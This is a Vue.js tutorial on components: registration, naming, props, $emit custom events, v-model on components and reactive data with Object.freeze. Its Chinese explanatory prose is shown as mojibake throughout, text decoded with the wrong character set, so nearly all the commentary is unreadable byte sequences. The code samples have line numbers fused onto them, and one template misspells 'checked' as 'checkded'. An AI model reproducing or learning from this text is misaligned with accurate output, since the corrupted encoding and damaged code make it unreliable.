&lt;counter&gt;&lt;/counter&gt; &lt;counter&gt;&lt;/counter&gt; &lt;counter&gt;&lt;/counter&gt; &lt;/ul&gt;&lt;/div&gt; å¯ä»¥æ³¨æ„åˆ°æ¯å€‹çµ„ä»¶éƒ½æ˜¯ä¸€å€‹ç¨ç«‹å­˜åœ¨çš„ instance (å¯¦é«”)ï¼Œæ‰€ä»¥ä¸¦ä¸æœƒè¢«å½¼æ­¤çµ¦å¹²æ“¾ã€‚ ğŸ’¡ è¨» ï¼šä¸€å€‹çµ„ä»¶åªèƒ½æœ‰ä¸€å€‹æ ¹å…ƒç´ ï¼Œä¹Ÿå°±æ˜¯èªªå¦‚æœä½ çš„çµ„ä»¶ç‚ºå·¢ç‹€çµæ§‹ï¼Œè«‹åœ¨æœ€å¤–å±¤ä»¥ä¸€å€‹&lt;div&gt;ä¾†åŒ…è£¹ä½æ•´å€‹çµ„ä»¶çš„å…§å®¹ã€‚ çµ„ä»¶çš„å‘½ååœ¨å°çµ„ä»¶å‘½åæ™‚ï¼Œå»ºè­°éƒ½ä»¥ kebab-case (é€£å­—ç¬¦è™Ÿ) çš„æ–¹å¼ä¾†å‘½åã€‚ å¦‚æœä½¿ç”¨ camelCase (pascalCase) çš„è©±ï¼Œåœ¨ HTML ä¸­ä¹Ÿå¿…é ˆè¦è½‰æ›æˆ kebab-case çš„æ ¼å¼æ‰æœ‰è¾¦æ³•ä½¿ç”¨ï¼š 12345678910111213// â†“ kebab-caseVue.component('component-a', { template: ` &lt;div&gt;kebab-case compoent&lt;/div&gt; `})// â†“ camelCase (PascalCase)Vue.component('componentB', { template: ` &lt;div&gt;camelCase compoent&lt;/div&gt; `}) 12345&lt;component-a&gt;&lt;/component-a&gt;&lt;!-- â†“ å¿…é ˆè½‰æ›æˆ kebab-case --&gt;&lt;component-b&gt;&lt;/component-b&gt;&lt;!-- â†“ ä½¿ç”¨ camelCase çš„æ¨™ç±¤ç„¡æ•ˆ --&gt;&lt;componentB&gt;&lt;/componentB&gt; ğŸš€ Codepenï¼šé»é€™è£¡ å…¨åŸŸçµ„ä»¶èˆ‡å€åŸŸçµ„ä»¶å‰é¢æˆ‘å€‘ç”¨ Vue.component() ä¾†è¨»å†Šçš„çµ„ä»¶éƒ½ç¨±ç‚º å…¨åŸŸçµ„ä»¶ã€‚ å…¨åŸŸçµ„ä»¶å¯ä»¥è¢«ä»»ä½• new Vue å»ºç«‹çš„ Vueå¯¦é«” ä¾†ä½¿ç”¨ï¼Œé‚„æœ‰çµ„ä»¶ä¸­çš„å­çµ„ä»¶ä¹Ÿå¯ä»¥ä½¿ç”¨ã€‚ è€Œå€åŸŸçµ„ä»¶æ˜¯åœ¨ä¸€å€‹å¯¦é«”ä¸­é€é components å±¬æ€§ä¾†å»ºç«‹ï¼Œä¸¦ä¸”åªæœ‰é€™å€‹å¯¦é«”è‡ªå·±èƒ½å¤ ä½¿ç”¨ã€‚ å…¨åŸŸè¨»å†Š123456789101112131415161718192021222324// â†“ å…¨åŸŸçµ„ä»¶ AVue.component('component-a', { template: ` &lt;div class=\"component component--a\"&gt; &lt;h2&gt;çµ„ä»¶A&lt;/h2&gt; &lt;p&gt;çµ„ä»¶Açš„æ–‡å­—&lt;/p&gt; &lt;/div&gt;`})// â†“ å…¨åŸŸçµ„ä»¶ BVue.component('component-b', { // â†“ åœ¨ çµ„ä»¶B ä¸­ä½¿ç”¨ çµ„ä»¶A template: ` &lt;div class=\"component\"&gt; &lt;h2&gt;çµ„ä»¶B&lt;/h2&gt; &lt;p&gt;åœ¨çµ„ä»¶Bä¸­ä½¿ç”¨çµ„ä»¶A&lt;/p&gt; &lt;component-a&gt;&lt;/component-a&gt; &lt;/div&gt;`})// â†“ new Vue å¯¦é«”let vm = new Vue({ el: '#app'}) ğŸš€ Codepenï¼šé»é€™è£¡ å…¨åŸŸçµ„ä»¶åœ¨æ•´å€‹ Vue.js çš„æ‡‰ç”¨ç¨‹å¼ä¸­éƒ½å¯ä»¥ä½¿ç”¨ï¼Œä¸åªæ˜¯new Vueå¯¦é«”ï¼Œç”šè‡³é€£åœ¨å…¶ä»–çµ„ä»¶ä¸­ä¹Ÿèƒ½ä½¿ç”¨ã€‚ å€åŸŸè¨»å†Šå…¨åŸŸçµ„ä»¶æœ‰ä¸€å€‹å¾ˆå¤§çš„ç¼ºé»æ˜¯ï¼Œä¸ç®¡é€™å€‹çµ„ä»¶æœ‰æ²’æœ‰è¢«ä½¿ç”¨ï¼Œéƒ½æœƒè¢«è¼‰å…¥ã€‚ æ‰€ä»¥å¦‚æœæ˜¯çµ¦ç‰¹å®šçš„å¯¦é«”ä½¿ç”¨çš„è©±ï¼Œå¯ä»¥æ”¹ç”¨å€åŸŸè¨»å†Šçš„æ–¹å¼ä¾†å»ºç«‹çµ„ä»¶ã€‚ 123456789101112131415161718192021222324let vm = new Vue({ el: '#app', // â†“ åœ¨å¯¦é«”ä¸­ä½¿ç”¨ components å±¬æ€§ // â†“ ä¾†è¨»å†Šå€åŸŸçµ„ä»¶ components: { 'component-a': { template: ` &lt;div class=\"component component--a\"&gt; &lt;h2&gt;å€åŸŸçµ„ä»¶A&lt;/h2&gt; &lt;p&gt;å€åŸŸçµ„ä»¶Açš„æ–‡å­—&lt;/p&gt; &lt;/div&gt;` }, // â†“ åœ¨ çµ„ä»¶B ä¸­ä½¿ç”¨ çµ„ä»¶A 'component-b': { template: ` &lt;div class=\"component\"&gt; &lt;h2&gt;å€åŸŸçµ„ä»¶B&lt;/h2&gt; &lt;p&gt;é€™è£¡ç„¡æ³•ä½¿ç”¨å€åŸŸçµ„ä»¶A&lt;/p&gt; &lt;component-a&gt;&lt;/component-a&gt; &lt;/div&gt;` } }}) ğŸš€ Codepenï¼šé»é€™è£¡ å¯ä»¥çœ‹åˆ° çµ„ä»¶B ä¸­æ²’è¾¦æ³•ä½¿ç”¨ çµ„ä»¶Aï¼Œæ­¤è™•çš„ çµ„ä»¶A æœƒè¢«ç›´æ¥æ¸²æŸ“æˆä¸€å€‹æ²’æœ‰å…§å®¹çš„æ¨™ç±¤ï¼Œè€Œ Vue ä¹Ÿæœƒåœ¨ console å ±éŒ¯ã€‚ å¦‚æœè¦åœ¨ çµ„ä»¶B ä¸­ä½¿ç”¨ çµ„ä»¶Aï¼Œåªèƒ½åœ¨ çµ„ä»¶B é€™å€‹å¯¦é«”ä¸‹åœ¨è¨»å†Šä¸€å€‹å€åŸŸçµ„ä»¶ï¼Œæ‰æœ‰è¾¦æ³•é”æˆã€‚ ğŸ’¡ è¨» ï¼šæ¯å€‹çµ„ä»¶éƒ½å¯ä»¥è¦–ç‚ºæ˜¯ä¸€å€‹ç¨ç«‹çš„å¯¦é«”ã€‚ 12345678910111213141516171819202122232425262728let vm = new Vue({ el: '#app', // â†“ åœ¨ new Vueå¯¦é«”ä¸­ä½¿ç”¨ components å±¬æ€§ // â†“ ä¾†è¨»å†Šå€åŸŸçµ„ä»¶ components: { 'component-b': { template: ` &lt;div class=\"component\"&gt; &lt;h2&gt;å€åŸŸçµ„ä»¶B&lt;/h2&gt; &lt;p&gt;åœ¨æ­¤è™•ä½¿ç”¨çµ„ä»¶A&lt;/p&gt; &lt;component-a&gt;&lt;/component-a&gt; &lt;/div&gt;`, // åœ¨ çµ„ä»¶B å¯¦é«”ä¸­ä½¿ç”¨ components å±¬æ€§ // ä¾†è¨»å†Šçµ„ä»¶A components: { 'component-a': { template: ` &lt;div class=\"component component--a\"&gt; &lt;h2&gt;å€åŸŸçµ„ä»¶A&lt;/h2&gt; &lt;p&gt;å€åŸŸçµ„ä»¶Açš„æ–‡å­—&lt;/p&gt; &lt;/div&gt;` } } } }}) ğŸš€ Codepenï¼šé»é€™è£¡ é€™æ¨£å­å°±èƒ½é †åˆ©åœ¨ çµ„ä»¶B ä¸­ä½¿ç”¨ çµ„ä»¶A å›‰ã€‚ çˆ¶å­çµ„ä»¶é–“çš„è³‡æ–™å‚³è¼¸å› ç‚ºçˆ¶çµ„ä»¶è·Ÿå­çµ„ä»¶æ˜¯å±¬æ–¼ä¸åŒçš„å¯¦é«”ï¼Œæ‰€ä»¥å­çµ„ä»¶æ²’è¾¦æ³•ç›´æ¥å»ä½¿ç”¨çˆ¶çµ„ä»¶çš„æ–¹æ³•ï¼Œä¹Ÿä¸èƒ½ä¿®æ”¹çˆ¶çµ„ä»¶ä¸­çš„è³‡æ–™ã€‚ è¦è®“çˆ¶å­ä¹‹é–“åšæºé€šï¼Œå¿…é ˆä½¿ç”¨ propså±¬æ€§ åŠ $emitæ–¹æ³•æ‰æœ‰è¾¦æ³•é”æˆã€‚ æœ‰ä¸€å¥å£è¨£æ˜¯é€™æ¨£å­ï¼š Props down, Events up (propsä¸‹å»ï¼Œeventä¸Šä¾†)ã€‚ å¦‚åŒä¸‹é¢é€™å¼µåœ–æ‰€ç¤ºï¼š å°‡çˆ¶çµ„ä»¶çš„è³‡æ–™ props åˆ°å­çµ„ä»¶ä¸­é€™è£¡ç›´æ¥èˆ‰ä¾‹å­ä¾†èªªæ˜ã€‚ ç‚ºäº†è¦åœ¨å­çµ„ä»¶ä¸­å–å¾—çˆ¶çµ„ä»¶çš„ msgï¼Œæˆ‘å€‘æœƒå»ºç«‹ä¸€å€‹ props ç”¨ä¾†æŠŠè³‡æ–™çµ¦å‚³éä¸‹å»ã€‚ 123456789101112131415161718192021222324Vue.component('my-component', { template: ` &lt;div class=\"component\"&gt; &lt;p&gt;çµ„ä»¶è‡ªå·±çš„è³‡æ–™ï¼š{{ msg }} &lt;/p&gt; &lt;p&gt;å¾çˆ¶å…ƒä»¶å‚³éé€²ä¾†çš„è³‡æ–™ï¼š {{ parentMsg }}&lt;/p&gt; &lt;/div&gt;`, // â†“ ç”¨ä¾†æŠŠçˆ¶å…ƒä»¶çš„è³‡æ–™å‚³éåˆ°å­çµ„ä»¶ props: ['parentMsg'], // â†“ çµ„ä»¶è‡ªå·±çš„è³‡æ–™ data() { return { msg: 'Hello' } }})let app = new Vue({ el: '#app', // â†“ çˆ¶çµ„ä»¶çš„è³‡æ–™ data: { msg: 'Parent' }}) æ¥è‘—åœ¨å­çµ„ä»¶è¨­å®šå®Œ propså¾Œï¼Œå¿…é ˆä½¿ç”¨ v-bind ä¾†æŠŠçˆ¶çµ„ä»¶ä¸­çš„è³‡æ–™ç¶å®šçµ¦å­çµ„ä»¶ã€‚ ğŸ’¡ è¨»ï¼šHTML çš„å±¬æ€§æ²’æœ‰å¤§å°å¯«æ•æ„Ÿ(Case-insensitive)çš„ç‰¹æ€§ï¼Œæ‰€ä»¥å¦‚æœpropsæ˜¯ä»¥(Camel-case)é§å³°å¼çš„å¯«æ³•ä¾†å‘½åï¼Œé‚£éº¼åœ¨ HTML ä¸­å‰‡å¿…é ˆä½¿ç”¨Kebab-case (é€£å­—ç¬¦è™Ÿ)ä¾†è¡¨ç¤º props æ‰€å®šç¾©çš„å±¬æ€§ 1234&lt;div id=\"app\"&gt; &lt;!-- â†“ æŠŠçˆ¶å…ƒä»¶çš„ msg ç¶å®šåˆ°å­çµ„ä»¶ä¸Š --&gt; &lt;my-component v-bind:parent-msg=\"msg\"&gt;&lt;/my-component&gt;&lt;/div&gt; ğŸš€ Codepenï¼šé»é€™è£¡ é€™æ¨£å­å°±æˆåŠŸæŠŠçˆ¶çµ„ä»¶çš„è³‡æ–™å‚³éçµ¦å­çµ„ä»¶å›‰ã€‚ é€™è£¡æä¾›ä¸€ç¨®è¨˜æ†¶æ–¹å¼ï¼Œä½ å¯ä»¥æŠŠ props æƒ³æˆæ˜¯ å®£å‘Šä¸€å€‹è®Šæ•¸ï¼Œè€Œ v-bind å¯ä»¥æƒ³æˆæ˜¯åœ¨çµ¦è®Šæ•¸ è³¦å€¼ã€‚ ç•¶éœ€è¦å‚³å…¥å¾ˆå¤šè³‡æ–™åˆ°çµ„ä»¶ä¸­æ™‚å‡è¨­æˆ‘å€‘æœ‰ä¸€å€‹æ–‡ç« çš„çµ„ä»¶ï¼Œé•·çš„åƒé€™æ¨£å­ã€‚ ğŸš€ Codepenï¼šé»é€™è£¡ è€Œçµ„ä»¶çš„çµæ§‹å¦‚ä¸‹ï¼š 12345678910111213141516&lt;div id=\"app\"&gt; &lt;div class=\"wrap\"&gt; &lt;!-- â†“ æ–‡ç« çµ„ä»¶ --&gt; &lt;blog-post v-for=\"post in posts\" v-bind:title=\"post.title\" v-bind:content=\"post.content\" v-bind:img=\"post.img\" :key=\"post.id\" &gt;&lt;/blog-post&gt; &lt;!-- â†‘ åœ¨çµ„ä»¶ä¸­å‚³å…¥è³‡æ–™ --&gt; &lt;!-- 1. æ¨™é¡Œ --&gt; &lt;!-- 2. å…§å®¹ --&gt; &lt;!-- 3. åœ–ç‰‡ --&gt; &lt;/div&gt;&lt;/div&gt; 123456789101112131415161718192021222324252627let vm = new Vue({ el: '#app', data: { // â†“ æ¯ç¯‡æ–‡ç« çš„è³‡æ–™ posts: [ { id: 1, title: '...', content: '...', img: '...' }, { id: 2, title: '...', content: '...', img: '...' }, { id: 3, title: '...', content: '...', img: '...' }, { id: 4, title: '...', content: '...', img: '...' }, { id: 5, title: '...', content: '...', img: '...' } ] }, components: { // â†“ æ–‡ç« çµ„ä»¶çš„è¨­å®š 'blog-post': { template: ` &lt;div&gt; &lt;img v-bind:src=\"img\"&gt; &lt;h2&gt;{{ title }}&lt;/h2&gt; &lt;p&gt;{{ content }}&lt;/p&gt; &lt;/div&gt; `, // â†“ è¨­å®šè¦å‚³å…¥åˆ°çµ„ä»¶ä¸­çš„è³‡æ–™ props: ['title', 'content', 'img'] } }}) &lt;blog-post&gt;ä¸­éœ€è¦ title (æ¨™é¡Œ)ã€ content (å…§å®¹)ã€ img (åœ–ç‰‡) é€™äº›è³‡æ–™ï¼Œæ‰€ä»¥æˆ‘å€‘å°±å¾— props é€™äº›è³‡æ–™åˆ°çµ„ä»¶ä¸­ã€‚ æ‰€ä»¥å¯ä»¥çœ‹åˆ° props ä¸­éœ€è¦å¯«å…¥å¾ˆå¤šå€‹å±¬æ€§ï¼Œä»¥åŠ HTML ä¸­ç”¨äº†å¾ˆå¤š v-bind ä¾†ç¶å®šé€™äº› props ã€‚ å¦‚æœç¾åœ¨æƒ³è¦å†æ·»åŠ  date (æ—¥æœŸ)ï¼Œ comments (ç•™è¨€) ç­‰ç­‰çš„è³‡æ–™ï¼Œ props è·Ÿ HTML å°±ä¹Ÿå¾—æŠŠé€™äº›å°æ‡‰çš„è³‡æ–™çµ¦åŠ é€²å»ï¼Œè³‡æ–™ä¹Ÿæœƒè®Šå¾—è¶Šä¾†è¶Šè¤‡é›œã€‚ è¦è™•è£¡é€™ç¨®è³‡æ–™å¾ˆè¤‡é›œçš„æƒ…æ³ï¼Œæˆ‘å€‘å¯ä»¥ç¨å¾®ä¿®æ”¹ä¸€ä¸‹æ•´é«”çš„çµæ§‹ï¼Œå¦‚ä¸‹ï¼š 123456789101112&lt;div id=\"app\"&gt; &lt;div class=\"wrap\"&gt; &lt;!-- â†“ æ–‡ç« çµ„ä»¶ --&gt; &lt;blog-post v-for=\"post in posts\" :key=\"post.id\" v-bind:post=\"post\" &gt;&lt;/blog-post&gt; &lt;!-- â†‘ ç¾åœ¨å‚³å…¥åŒ…å«æ•´å€‹æ–‡ç« è³‡æ–™çš„ post --&gt; &lt;!-- â†‘ è€Œä¸æ˜¯æ¯ä¸€ç­†è³‡æ–™ --&gt; &lt;/div&gt;&lt;/div&gt; 12345678910111213141516171819202122232425262728let vm = new Vue({ el: '#app', data: { // â†“ æ¯ç¯‡æ–‡ç« çš„è³‡æ–™ posts: [ { id: 1, title: '...', content: '...', img: '...' }, { id: 2, title: '...', content: '...', img: '...' }, { id: 3, title: '...', content: '...', img: '...' }, { id: 4, title: '...', content: '...', img: '...' }, { id: 5, title: '...', content: '...', img: '...' } ] }, components: { // â†“ æ–‡ç« çµ„ä»¶çš„è¨­å®š 'blog-post': { // â†“ æ¨¡æ¿ä¸­çš„è³‡æ–™ç¨å¾®åšèª¿æ•´ template: ` &lt;div&gt; &lt;img v-bind:src=\"post.img\"&gt; &lt;h2&gt;{{ post.title }}&lt;/h2&gt; &lt;p&gt;{{ post.content }}&lt;/p&gt; &lt;/div&gt; `, // â†“ è¨­å®šè¦å‚³å…¥åˆ°çµ„ä»¶ä¸­çš„è³‡æ–™ props: ['post'] } }}) å¯«æˆé€™æ¨£å­å¾Œï¼Œåœ¨ post ä¸­åŠ å…¥æ–°çš„è³‡æ–™ï¼Œéƒ½èƒ½ç›´æ¥åœ¨ &lt;blog-post&gt; ä¸­ä½¿ç”¨ ï¼Œä¸éœ€è¦åœ¨é¡å¤–å° props æˆ– HTML ä¸­åŠ å…¥æ–°çš„è³‡æ–™ã€‚ ç›£è½çµ„ä»¶ä¸­çš„äº‹ä»¶ä¸€æ¨£æ‹¿å‰é¢çš„ä¾‹å­ä¾†èªªï¼Œå‡è¨­ç¾åœ¨æˆ‘å€‘æƒ³è¦åœ¨çµ„ä»¶ä¸­æ·»åŠ ä¸€å€‹æŒ‰éˆ•ï¼Œé€™å€‹æŒ‰éˆ•èƒ½å¤ ç”¨ä¾†æ§åˆ¶å­—é«”å¤§å°ï¼Œåƒé€™æ¨£å­ï¼š ğŸš€ Codepenï¼šé»é€™è£¡ è©²æ€éº¼åšå‘¢ï¼Ÿ é¦–å…ˆå…ˆåœ¨ data ä¸­æ–°å¢ä¸€ç­†ç”¨ä¾†æ§åˆ¶æ–‡å­—å¤§å°çš„ propertyã€‚ 12345678let vm = new Vue({ el: '#app', data: { posts: [...], // â†“ æ§åˆ¶æ–‡å­—å¤§å° postFontSize: 1 },}) æ¥è‘—åœ¨ HTML æ–°å¢ä¸€å€‹å…ƒç´ ï¼Œç”¨ä¾†æ§åˆ¶&lt;blog-post&gt;æ–‡å­—å¤§å°ã€‚ 12345678910&lt;div id=\"app\"&gt; &lt;!-- â†“ ç”¨ä¾†è¨­å®šæ–‡å­—å¤§å°çš„æ–°å…ƒç´  --&gt; &lt;div :style=\"{fontSize: postFontSize + 'em'}\"&gt; &lt;blog-post v-for=\"post in posts\" v-bind:post=\"post\" :key=\"post.id\" &gt;&lt;/blog-post&gt; &lt;/div&gt;&lt;/div&gt; æ¥ä¸‹ä¾†åœ¨çµ„ä»¶çš„ template ä¸­è¨­ç½®é‚£å€‹æ§åˆ¶æ–‡å­—å¤§å°çš„æŒ‰éˆ•ã€‚ 12345678910111213141516171819202122232425let vm = new Vue({ el: '#app', data: { // ... } components: { 'blog-post': { template: ` &lt;div&gt; &lt;img v-bind:src=\"img\"&gt; &lt;h2&gt;{{ post.title }}&lt;/h2&gt; &lt;p&gt;{{ post.content }}&lt;/p&gt; &lt;a href=\"#\"&gt;Read more&lt;/a&gt; // â†“ é‚£å€‹æŒ‰éˆ• &lt;button&gt;{{ size }}&lt;/button&gt; &lt;/div&gt; `, // â†“ å‚³é size (æ–‡å­—æ¯”ä¾‹) çµ¦çµ„ä»¶ props: ['post', 'size'] } }}) ğŸ’¡ è¨» ï¼šé€™è£¡å¸Œæœ›æŒ‰éˆ•èƒ½é¡¯ç¤ºç›®å‰çš„æ–‡å­—çš„æ¯”ä¾‹ï¼Œæ‰€ä»¥ props ä¸€ç­†è³‡æ–™çµ¦çµ„ä»¶ã€‚ æ¥è‘—åªè¦è¨­å®šé»æ“Šäº‹ä»¶å°±å¯ä»¥äº†ï¼Œä½ å¯èƒ½æœƒæƒ³èªªé€™æ¨£å¯«ï¼š 1234{ // â†“ é»æ“Šä¸€ä¸‹ï¼Œå¢åŠ  0.1 çš„å¤§å°ã€‚ template: `&lt;button v-on:click=\"postFontSize+=0.1\"&gt;{{ size }}&lt;/button&gt;`} é€™æ¨£å­æ˜¯æ²’æœ‰ä½œç”¨çš„ã€‚å†æé†’ä¸€æ¬¡ï¼Œå­çµ„ä»¶ç„¡æ³•ä¿®æ”¹çˆ¶çµ„ä»¶çš„è³‡æ–™ã€‚ åªæœ‰çˆ¶çµ„ä»¶èƒ½å¤ ä¿®æ”¹ data ä¸­çš„è³‡æ–™ï¼Œæ‰€ä»¥æ€è·¯è¦è®Šæˆ â†’ è®“çˆ¶çµ„ä»¶ç›£è½åœ¨å­çµ„ä»¶ä¸­ç™¼ç”Ÿçš„äº‹ä»¶ï¼Œç•¶çˆ¶çµ„ä»¶ç›£è½åˆ°å…§éƒ¨çš„äº‹ä»¶ç™¼ç”Ÿæ™‚ï¼Œå†ä¾†ä¿®æ”¹è³‡æ–™ã€‚ ä¹Ÿå°±æ˜¯èªªè¦åœ¨&lt;blog-post&gt;ä¸Šè¨­å®šä¸€å€‹èƒ½å¤ ç›£è½å…§éƒ¨å­å…ƒç´ çš„äº‹ä»¶ã€‚ é€™è¦æ€éº¼åšåˆ°å‘¢ï¼Ÿ Vue æä¾›äº†ä¸€å€‹ è‡ªå®šç¾©äº‹ä»¶ çš„ç³»çµ±ï¼Œè®“æˆ‘å€‘å¯ä»¥è‡ªå·±å»ºç«‹ä¸€ç¨®äº‹ä»¶ï¼Œæ‰€ä»¥å¯ä»¥é€™æ¨£å­è¨­å®šï¼š 123&lt;!-- â†“ è‡ªå®šç¾©ä¸€å€‹ enlarge-text äº‹ä»¶ --&gt;&lt;!-- â†“ ç™¼ç”Ÿæ™‚è§¸ç™¼ changeFontSize å‡½å¼--&gt;&lt;blog-post v-on:enlarge-text=\"changeFontSize\"&gt;&lt;/blog-post&gt; æ¥è‘—è¦åœ¨ template ä¸­çš„æŒ‰éˆ•ä¸­å®šç¾©é€™å€‹äº‹ä»¶ã€‚ 123456{ // â†“ é»æ“Šæ™‚è§¸ç™¼ä¸€å€‹ enlargeText äº‹ä»¶ // â†“ $emitæ–¹æ³• æœƒæŠŠ enlargeText äº‹ä»¶å‚³éçµ¦ &lt;blog-post&gt; è§¸ç™¼ // â†“ 0.1 æ˜¯è¦å‚³éçµ¦ &lt;blog-post&gt; çš„è³‡æ–™(åƒæ•¸) template: `&lt;button v-on:click=\"$emit('enlargeText', 0.1)\"&gt;{{ size }}&lt;/button&gt;`} æœ€å¾Œåœ¨ data ä¸­çš„ methods å®šç¾©ç”¨ä¾†è™•ç†äº‹ä»¶çš„å‡½å¼ã€‚ 123456methods: { // â†“ enlargeAmount = $emit å‚³ééä¾†çš„è³‡æ–™ (0.1) changeFontSize: function(enlargeAmount) { this.postFontSize += enlargeAmount }} é€™æ¨£å­å°±å®Œæˆäº†ã€‚ é›–ç„¶çœ‹èµ·ä¾†æœ‰é»è¤‡é›œï¼Œä½†é€™ä¸€å¤§ä¸²çš„ç›®çš„å…¶å¯¦åªæœ‰ä¸€å€‹ï¼Œè®“çˆ¶å…ƒç´ èƒ½å¤ ç›£è½åˆ°æŒ‰éˆ•çš„ click äº‹ä»¶ï¼Œæ¥è‘—åšå°æ‡‰è™•ç†ï¼Œå°±é€™éº¼å–®ç´”è€Œå·²ã€‚ åœ¨çµ„ä»¶ä¸Šä½¿ç”¨ v-modelå†è¤‡ç¿’ä¸€æ¬¡ v-model çš„åŸç†ã€‚ 123&lt;input v-model=\"text\" /&gt;&lt;!-- â†“ ç­‰åŒæ–¼ä»¥ä¸‹ --&gt;&lt;input v-bind:value=\"text\" v-on:input=\"text = $event\" /&gt; ç‰¹åˆ¥æ³¨æ„ä¸€é»ï¼šv-model é è¨­ç¶å®šçš„å±¬æ€§æ˜¯valueï¼Œç›£è½çš„äº‹ä»¶æ˜¯inputã€‚ è€Œæˆ‘å€‘çš„æœ€çµ‚ç›®æ¨™æ˜¯é€™æ¨£ï¼š 1&lt;my-component v-model=\"text\"&gt;&lt;/my-component&gt; ç­‰æ–¼è¦è®Šæˆé€™æ¨£ï¼š 1&lt;my-component v-bind:value=\"text\" v-on:input=\"text = $event\"&gt;&lt;/my-component&gt; ä¹Ÿå°±æ˜¯èªªæˆ‘å€‘å¿…é ˆç”Ÿå‡ºä¸€å€‹ value å±¬æ€§è®“çµ„ä»¶å¯ä»¥ v-bindï¼Œä»¥åŠç”¨ä¾†ç›£è½ input äº‹ä»¶çš„ç›£è½å™¨ã€‚ æ‰€ä»¥ï¼Œæˆ‘å€‘å¾— props ä¸€å€‹å«åš value çš„å±¬æ€§ï¼ŒåŒæ™‚åœ¨çµ„ä»¶ä¸­çš„å­å…ƒç´ æ‹‹å‡ºä¸€å€‹ input çš„è‡ªå®šç¾©äº‹ä»¶ï¼Œå¦‚ä¸‹ï¼š 12345678910Vue.component('my-component', { // â†“ æ‹‹å‡º input äº‹ä»¶ + ç•¶å‰ input çš„å€¼ template: ` &lt;div&gt; &lt;input v-bind:value=\"value\" v-on:input=\"$emit('input', $event.target.value)\"&gt; &lt;/div&gt; `, // â†“ å»ºç«‹ value å±¬æ€§ props: ['value']}) é€™æ¨£å­çµ„ä»¶ä¸Šçš„ v-model å°±èƒ½å¤ æ­£å¸¸é‹ä½œå›‰ã€‚ ğŸš€ Codepenï¼šé»é€™è£¡ å®¢è£½çµ„ä»¶çš„ v-modelç”±æ–¼ v-model æ˜¯ v-bind:value åŠ v-on:input çš„èªæ³•ç³–ï¼Œæ‰€ä»¥å¦‚æœè¦åšé›™å‘ç¶å®šçš„å…ƒç´ æ˜¯ &lt;input&gt; çš„è©±æ²’ä»€éº¼å•é¡Œã€‚ ä½†å¦‚æœç¾åœ¨è¦ç¶çš„å…ƒç´ è®Šæˆ radio æˆ–æ˜¯ checkbox ä¹‹é¡çš„å…ƒç´ ï¼Œå°±ç„¡æ³•å¥—ç”¨ v-model çš„é è¨­å€¼ã€‚ é€™å€‹æ™‚å€™å°±å¾—å° v-bind åŠ v-on å®¢è£½åŒ–ï¼Œä¾†è®“ v-model èƒ½å¤ é †åˆ©é‹ä½œã€‚ ä½ å¯ä»¥åœ¨çµ„ä»¶ä¸­åŠ ä¸Šä¸€å€‹ model çš„å±¬æ€§ä¾†åšè¨­å®šï¼Œå¦‚ä¸‹ï¼š 12345678910111213141516171819202122Vue.component('my-checkbox', { template: ` &lt;label&gt; &lt;input type=\"checkbox\" v-bind:checked=\"checkded\" v-on:change=\"$emit('change', $event.target.checked)\" &gt; å®¢è£½åŒ–v-model &lt;/label&gt; `, props: ['checked'], // â†“ model å±¬æ€§ model: { // â†“ åŸé è¨­æ˜¯ v-bind:value // â†“ å®¢è£½åŒ–ç‚º v-bind:checked prop: 'checked', // â†“ åŸé è¨­æ˜¯ v-on:input // â†“ å®¢è£½åŒ–ç‚º v-on:change event: 'change' }}) 1234567891011&lt;div class=\"wrap\"&gt; &lt;div id=\"app\"&gt; &lt;!-- â†“ v-model èªæ³•ç³– --&gt; &lt;my-checkbox v-model=\"ischecked\"&gt;&lt;/my-checkbox&gt; &lt;!-- â†“ ç­‰æ–¼ä»¥ä¸‹ --&gt; &lt;my-checkbox :checked=\"ischecked\" v-on:change=\"ischecked = $event\" &gt;&lt;/my-checkbox&gt; &lt;/div&gt;&lt;/div&gt; ğŸš€ Codepenï¼šé»é€™è£¡ Vue çš„éŸ¿æ‡‰å¼æ›´æ–°å¦‚åŒå‰é¢çš„ç¤ºç¯„ï¼Œç•¶ä½ åœ¨ Vue çš„dataä¸­åŠ å…¥æŸäº›è³‡æ–™æ™‚ï¼Œé€™äº›è³‡æ–™å°±æœƒè·Ÿ Vue ç›¸ä¾ç‚ºå‘½ã€‚ ç•¶è³‡æ–™çš„å€¼æ”¹è®Šæ™‚ï¼ŒVue ä¸­çš„ data å€¼ä¹Ÿæœƒè·Ÿè‘—æ”¹è®Šã€‚ ç•¶ Vue ä¸­çš„ data å€¼æ”¹è®Šæ™‚ï¼Œè³‡æ–™çš„å€¼ä¹Ÿæœƒè·Ÿè‘—æ”¹è®Šã€‚ 12345678910111213141516171819202122232425// â†“ è³‡æ–™let data = { a: 1 }// â†“ å»ºç«‹ Vue å¯¦é«”let vm = new Vue({ // â†“ æŠŠè³‡æ–™æ”¾å…¥åˆ° data ä¸­ data: data})// â†“ ç›¸è¦ªç›¸æ„› (true)console.log(vm.a === data.a)// â†“ æ›´æ”¹è³‡æ–™çš„å€¼data.a = 2// â†“ Vueä¸­çš„ data åŒæ­¥æ›´æ–°// â†“ (2)console.log(vm.a)// â†“ åéä¾†ä¹Ÿä¸€æ¨£vm.a = 3// â†“ è³‡æ–™çš„å€¼åŒæ­¥æ›´æ–°// â†“ (3)console.log(data.a) ä½†æœ‰ä¸€å€‹ä¾‹å¤–ï¼Œå°±æ˜¯ä½¿ç”¨äº†Object.freeze()ã€‚ 123456&lt;div id=\"app\" class=\"wrap\"&gt; &lt;!-- â†“ é¡¯ç¤º foo çš„å€¼ --&gt; &lt;p class=\"txt\"&gt;{{ foo }}&lt;/p&gt; &lt;!-- â†“ é»æ“ŠæŒ‰éˆ•æ™‚ï¼Œè®Šæ›´ foo çš„å€¼ --&gt; &lt;button @click=\"foo='Fooooooo'\" class=\"btn\"&gt;Change&lt;/button&gt;&lt;/div&gt; 12345678// â†“ è³‡æ–™let obj = { foo: 'bar' }let vm = new Vue({ el: '#app', // â†“ æŠŠè³‡æ–™æ”¾å…¥åˆ° data ä¸­ data: obj}) åœ¨éŸ¿æ‡‰å¼çš„æƒ…æ³ä¸‹æ˜¯é€™æ¨£å­ï¼š ä½†åŠ å…¥ Object.freeze()å¾Œï¼Œè³‡æ–™çš„å€¼å°±ç„¡æ³•æ›´æ–°ã€‚ 123456789101112// â†“ è³‡æ–™let obj = { foo: 'bar' }// â†“ å°å°èµ·ä¾†Object.freeze(obj)let vm = new Vue({ el: '#app', // â†“ æŠŠè³‡æ–™æ”¾å…¥åˆ° data ä¸­ data: obj}) ğŸ’¡ è¨» 